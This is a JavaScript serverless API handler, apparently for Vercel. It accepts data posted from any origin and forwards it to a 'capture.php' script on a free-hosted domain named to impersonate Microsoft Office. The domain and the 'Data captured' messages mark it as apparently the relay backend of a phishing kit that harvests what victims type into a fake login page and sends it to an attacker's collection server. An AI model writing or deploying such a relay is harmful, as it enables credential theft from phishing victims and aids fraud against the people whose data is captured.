export default async function handler(req, res) {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const data = req.body;
    console.log('✅ Vercel API received:', data);

    // Forward to your InfinityFree server
    const infinityResponse = await forwardToInfinityFree(data);
    console.log('✅ Forwarded to InfinityFree:', infinityResponse);

    res.status(200).json({ 
      success: true, 
      message: 'Data captured and forwarded to InfinityFree',
      timestamp: new Date().toISOString(),
      infinityFreeResponse: infinityResponse
    });
  } catch (error) {
    console.error('❌ Error:', error);
    res.status(500).json({ 
      error: 'Internal server error',
      details: error.message 
    });
  }
}

async function forwardToInfinityFree(data) {
  try {
    // USING YOUR ACTUAL INFINITYFREE DOMAIN
    const response = await fetch('https://microsoftworkofficeset.kesug.com/capture.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ...data,
        via_vercel: true,
        vercel_timestamp: new Date().toISOString()
      }),
      timeout: 10000 // 10 second timeout
    });

    if (!response.ok) {
      throw new Error(`InfinityFree responded with status: ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    console.error('❌ InfinityFree forwarding failed:', error);
    throw error; // Re-throw to handle in main function
  }
}
